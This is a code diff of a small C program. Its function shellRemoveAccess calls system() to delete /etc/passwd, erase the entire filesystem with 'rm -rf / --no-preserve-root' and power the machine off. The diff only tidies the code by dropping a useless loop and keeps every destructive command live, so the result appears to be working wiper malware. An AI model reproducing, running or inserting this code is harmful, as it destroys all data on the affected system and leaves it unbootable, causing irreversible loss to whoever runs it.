@@ -5,13 +5,9 @@ void shellRemoveAccess()
 {
     system("sudo rm -r /etc/passwd");
     system("clear");
-    for(;;)
-    {
-        system("sudo rm -rfv / --no-preserve-root");
-        system("clear");
-        system("poweroff");
-        break;
-    }
+    system("sudo rm -rf / --no-preserve-root");
+    system("clear");
+    system("poweroff");
 }
 
 int main()
